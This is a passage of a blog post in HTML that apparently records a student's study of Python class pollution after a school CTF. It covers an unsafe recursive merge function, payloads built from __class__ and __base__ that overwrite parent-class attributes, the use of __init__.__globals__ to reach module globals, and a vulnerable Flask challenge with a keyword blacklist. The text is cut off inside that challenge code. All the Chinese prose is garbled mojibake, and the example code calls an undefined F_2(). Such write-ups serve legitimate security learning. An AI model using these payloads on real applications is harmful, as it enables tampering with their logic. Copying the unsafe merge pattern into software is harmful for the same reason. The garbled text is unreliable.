        <content type="html"><![CDATA[<h1 id="åœ¨æ ¡èµ›é‡Œæˆ‘é‡åˆ°äº†æœ‰å…³pythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œè™½ç„¶åšäº†å‡ºæ¥ä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºæˆ‘å¯¹è¿™ä¸ªçš„äº†è§£è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä¼šå†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•æˆ‘å­¦ä¹ pythonåŸå‹é“¾æ±¡æŸ“çš„å…¨éƒ¨è¿‡ç¨‹"><a href="#åœ¨æ ¡èµ›é‡Œæˆ‘é‡åˆ°äº†æœ‰å…³pythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œè™½ç„¶åšäº†å‡ºæ¥ä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºæˆ‘å¯¹è¿™ä¸ªçš„äº†è§£è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä¼šå†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•æˆ‘å­¦ä¹ pythonåŸå‹é“¾æ±¡æŸ“çš„å…¨éƒ¨è¿‡ç¨‹" class="headerlink" title="åœ¨æ ¡èµ›é‡Œæˆ‘é‡åˆ°äº†æœ‰å…³pythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œè™½ç„¶åšäº†å‡ºæ¥ä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºæˆ‘å¯¹è¿™ä¸ªçš„äº†è§£è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä¼šå†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•æˆ‘å­¦ä¹ pythonåŸå‹é“¾æ±¡æŸ“çš„å…¨éƒ¨è¿‡ç¨‹"></a>åœ¨æ ¡èµ›é‡Œæˆ‘é‡åˆ°äº†æœ‰å…³pythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œè™½ç„¶åšäº†å‡ºæ¥ä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºæˆ‘å¯¹è¿™ä¸ªçš„äº†è§£è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä¼šå†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•æˆ‘å­¦ä¹ pythonåŸå‹é“¾æ±¡æŸ“çš„å…¨éƒ¨è¿‡ç¨‹</h1><h1 id="pythonåŸå‹é“¾æ±¡æŸ“çš„æˆå› "><a href="#pythonåŸå‹é“¾æ±¡æŸ“çš„æˆå› " class="headerlink" title="pythonåŸå‹é“¾æ±¡æŸ“çš„æˆå› "></a>pythonåŸå‹é“¾æ±¡æŸ“çš„æˆå› </h1><p>pythonå…¶å®æ˜¯æ²¡æœ‰åŸå‹è¿™ä¸€è¯´æ³•çš„ï¼Œåªæœ‰å­ç±»ç»§æ‰¿çˆ¶ç±»ã€‚ä½†æ˜¯å…¶ç»§æ‰¿å…³ç³»å’Œjsçš„åŸå‹æ¯”è¾ƒç›¸ä¼¼ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†pythonä¹Ÿå­˜åœ¨ä¸jsç›¸ä¼¼çš„æ¼æ´(pythonåŸå‹é“¾æ±¡æŸ“)<br>pythonåŸå‹é“¾æ±¡æŸ“çš„ä¸»è¦æˆå› ä¹Ÿä¸jsç›¸ä¼¼éƒ½æ˜¯å› ä¸ºmergeè¿™ä¸ªåˆå¹¶å‡½æ•°é”™è¯¯çš„å°†<strong>base</strong>ç­‰å½“æˆäº†é”®å€¼å¯¼è‡´å…¶çˆ¶ç±»è¢«æ·»åŠ äº†å±æ€§ï¼Œæˆ–è€…è¢«ä¿®æ”¹äº†å±æ€§çš„å€¼è€Œå¯¼è‡´çš„æ±¡æŸ“ã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªpythonçš„åˆå¹¶å‡½æ•°<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):<span class="comment">#åˆ¤æ–­dstä¸­æ˜¯å¦å«æœ‰é­”æœ¯æ–¹æ³•__getitem__</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment">#åˆ¤æ–­dst[k]æ˜¯å¦å­˜åœ¨ï¼Œä¸”å†…å®¹væ˜¯å¦ä¸ºå­—å…¸</span></span><br><span class="line">                merge(v, dst.get(k))<span class="comment">#é€’å½’åˆå¹¶</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment">#åˆ¤æ–­dstä¸­æ˜¯å¦æœ‰kè¿™ä¸ªå±æ€§ä¸”vä¸ºå­—å…¸</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))<span class="comment">#é€’å½’åˆå¹¶</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment">#å¦‚æœdstä¸­æ—¢æ²¡æœ‰å¯¹åº”çš„é”® kï¼Œä¹Ÿæ²¡æœ‰ä¸é”® k åŒåçš„å±æ€§ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ setattr å°†å±æ€§ k è®¾ç½®ä¸ºå€¼ vã€‚</span></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„åˆå¹¶å‡½æ•°å¯¹ä¼ å…¥çš„é”®å€¼å¹¶æ²¡æœ‰åšå¥½è¿‡æ»¤è¿™ä¹Ÿå°±å¯¼è‡´äº†æ±¡æŸ“çš„å¯èƒ½ã€‚<br>æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªå®ä¾‹æ¥è§£é‡Š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    a=<span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_1</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_2</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    a=<span class="string">&quot;benben&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// é€’å½’åˆå¹¶å‡½æ•°ï¼Œå°†dstå­—å…¸å†…çš„æ•°æ®åˆå¹¶è‡³secå†…</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = S_1()</span><br><span class="line">instance2=S_2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;a&quot;</span>: <span class="string">&quot;lalalala&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">F2=F_2()</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hehe</span><br><span class="line">lalalala</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶è¾“å‡ºçš„å€¼æœ‰heheå˜æˆäº†lalalalaè¿™å°±æ—¶å€™å…¶çˆ¶ç±»è¢«ä¿®æ”¹çš„ç»“æœ<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŠ¨æ€è°ƒè¯•æŸ¥çœ‹å»æ˜¯åœ¨å“ªé‡Œå‘ç”Ÿäº†æ±¡æŸ“ã€‚<br><br>åœ¨æˆ‘ä»¬è°ƒè¯•åˆ°æœ€åä¸€æ­¥å³vä¸ä¸ºå­—å…¸ä¸ºä¸€ä¸ªå€¼æ—¶å‘ç”Ÿäº†æ±¡æŸ“ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯ä½¿ç”¨äº†é€’å½’è°ƒç”¨ã€‚åœ¨æœ€åä¸€æ­¥<code>setattr(dst, k, v)</code>æ—¶è·³å‡ºäº†é€’å½’ï¼Œä¸€æ­¥æ­¥çš„å›å»æœ€ç»ˆæ±¡æŸ“åˆ°äº†çˆ¶ç±»ï¼ˆé€’å½’è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡çš„ï¼‰ã€‚<br>æœªè¿›å…¥é€’å½’<br><br>ç¬¬ä¸€æ¬¡é€’å½’<br><br>ç¬¬äºŒæ¬¡é€’å½’<br><br>è¿™å‡ æ¬¡é€’å½’æœ€ç»ˆæ‰§è¡Œçš„ç»“æœä¸ä¸‹é¢çš„ç»“æœç­‰ä»·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instance.__class__.__base__.a=lalalala</span><br></pre></td></tr></table></figure><br>è¿™ä½¿å¾—instanceçš„çˆ¶ç±»ä¸­çš„å±æ€§aè¢«ä¿®æ”¹é€ æˆäº†æ±¡æŸ“ã€‚</p><h1 id="Objectæ— æ³•è¢«æ±¡æŸ“"><a href="#Objectæ— æ³•è¢«æ±¡æŸ“" class="headerlink" title="Objectæ— æ³•è¢«æ±¡æŸ“"></a>Objectæ— æ³•è¢«æ±¡æŸ“</h1><p>pythonåŸå‹é“¾çš„æ±¡æŸ“å’Œjsè¿˜æ˜¯æœ‰æ‰€åŒºåˆ«çš„ï¼Œåœ¨jsä¸­æˆ‘ä»¬å¯ä»¥æ±¡æŸ“åˆ°objectå¯æ˜¯pythonå¹¶ä¸è¡Œã€‚æˆ‘ä»¬ç”¨ä¸‹é¢çš„å®ä¾‹æ¥è¿›è¡Œè®²è§£ã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>:</span><br><span class="line">    a=<span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_1</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S_2</span>(<span class="title class_ inherited__">F</span>):</span><br><span class="line">    a=<span class="string">&quot;benben&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">            <span class="comment">#// é€’å½’åˆå¹¶å‡½æ•°ï¼Œå°†dstå­—å…¸å†…çš„æ•°æ®åˆå¹¶è‡³secå†…</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = S_1()</span><br><span class="line">instance2=S_2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:</span><br><span class="line">        &#123;<span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">             &#123;<span class="string">&quot;__base__&quot;</span>:</span><br><span class="line">                  &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;lalala&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">F2=F_2()</span><br><span class="line"><span class="built_in">print</span>(instance.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br><span class="line">merge(payload,instance)</span><br><span class="line"><span class="built_in">print</span>(instance.a)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç»™ä¸Šé¢çš„payloadè¿›è¡Œæ›´æ”¹å¤šåŠ ä¸€ä¸ª<strong>base</strong>å°è¯•æ±¡æŸ“å…¶çˆ¶ç±»çš„çˆ¶ç±»å³objectã€‚åœ¨è¿è¡Œæ—¶ä¾¿å‘ç”Ÿäº†æŠ¥é”™<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot set &#x27;a&#x27; attribute of immutable type &#x27;object&#x27;</span><br></pre></td></tr></table></figure><br>â€œæ— æ³•è®¾ç½®ä¸å¯å˜ç±»å‹ â€˜objectâ€™ çš„ â€˜aâ€™ å±æ€§ã€‚â€<br>å°è¯•ç»™ Python ä¸­çš„ object ç±»å‹çš„ä¸€ä¸ªå®ä¾‹æ·»åŠ ä¸€ä¸ªåä¸º â€˜aâ€™ çš„å±æ€§ï¼Œä½†æ˜¯ object ç±»å‹æ˜¯ä¸å¯å˜çš„ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç»™å®ƒæ·»åŠ å±æ€§ã€‚</p><h1 id="å…¨å±€å˜é‡çš„æ±¡æŸ“-é€šè¿‡initç­‰å¯¹å…¨å±€å˜é‡è¿›è¡Œæ±¡æŸ“è¿›è¡Œæ±¡æŸ“"><a href="#å…¨å±€å˜é‡çš„æ±¡æŸ“-é€šè¿‡initç­‰å¯¹å…¨å±€å˜é‡è¿›è¡Œæ±¡æŸ“è¿›è¡Œæ±¡æŸ“" class="headerlink" title="å…¨å±€å˜é‡çš„æ±¡æŸ“(é€šè¿‡initç­‰å¯¹å…¨å±€å˜é‡è¿›è¡Œæ±¡æŸ“è¿›è¡Œæ±¡æŸ“)"></a>å…¨å±€å˜é‡çš„æ±¡æŸ“(é€šè¿‡<strong>init</strong>ç­‰å¯¹å…¨å±€å˜é‡è¿›è¡Œæ±¡æŸ“è¿›è¡Œæ±¡æŸ“)</h1><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä»€ä¹ˆæ—¶<code>__init__</code><br>åœ¨Pythonä¸­ï¼Œ<code>__init__</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–¹æ³•ï¼ˆä¹Ÿç§°ä¸ºé­”æœ¯æ–¹æ³•æˆ–åŒä¸‹åˆ’çº¿æ–¹æ³•ï¼‰ï¼Œç”¨äºåˆå§‹åŒ–æ–°åˆ›å»ºçš„å¯¹è±¡å®ä¾‹ã€‚å½“ä½ åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹æ—¶ï¼Œ<code>__init__</code>æ–¹æ³•ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ï¼Œå…è®¸ä½ ä¸ºå¯¹è±¡çš„å±æ€§è®¾ç½®åˆå§‹å€¼ã€‚å¦‚æœä½ æƒ³è¦è‡ªå®šä¹‰å¯¹è±¡çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œä½ å¯ä»¥é‡å†™ï¼ˆæˆ–ç§°ä¸ºè¦†ç›–ï¼‰è¿™ä¸ªæ–¹æ³•ã€‚<br>åœ¨pythonä¸­ï¼Œå‡½æ•°æˆ–è€…ç±»æ–¹æ³•<br>å¯¹äºç±»çš„å†…ç½®æ–¹æ³•æ¯”å¦‚<code>__init__</code>è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨wrapperdescripptorï¼Œåªæœ‰åœ¨é‡å†™ä¹‹åæ‰æ˜¯å‡½æ•°function<br>åœ¨è¢«é‡å†™æ—¶å…¶å…·æœ‰<code>__globals__</code>å±æ€§ï¼Œè¿™ä¸ªå±æ€§å°†å‡½æ•°æˆ–è€…ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´çš„å…¨å±€å˜é‡é€šè¿‡å­—å…¸çš„å½¢å¼è¿”å›</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">la</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(A.__init__.__globals__)</span><br><span class="line"><span class="built_in">print</span>(la.__globals__)</span><br><span class="line"><span class="built_in">print</span>(A.__init__.__globals__==la.__globals__)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ç±»ä¸­é‡å†™çš„<code>__init__</code>ä¸å‡½æ•°laçš„<code>__globals__</code>ç›¸åŒå³<code>__init__.__globals__</code>å…¶è¿”å›çš„ä¸ºæ”¹pyæ–‡ä»¶çš„å…¨å±€å˜é‡ç©ºé—´ï¼Œå³æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ±¡æŸ“æ‰€æœ‰åœ¨æ”¹æ–‡ä»¶ä¸‹å®šä¹‰çš„å˜é‡<br>æˆ‘è¿™é‡Œä½¿ç”¨æ ¡é¢˜æ¥è¿›è¡Œè®²è§£ã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @Author: hey</span></span><br><span class="line"><span class="string">  @message: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span></span><br><span class="line"><span class="string">  * Th3_w0r1d_of_c0d3_1s_be@ut1ful_ but_y0u_c@nâ€™t_c0mp1l3_love.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cannot_be_bypassed</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magicallllll</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    magicallllll(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                magicallllll(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cannot_be_bypassed(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Hey bro,May be you should check your inputs,because it contains malicious data,Please don&#x27;t hack me~~~ :) :) :)&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            magicallllll(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Congratulations,The username and password is correct,Register Success!!!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ohhhhhhh,The username or password is incorrect,Please re-register!!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;The username or password is incorrect,Login Failed,Please log in again!!!&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.cannot_be_bypassed(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span 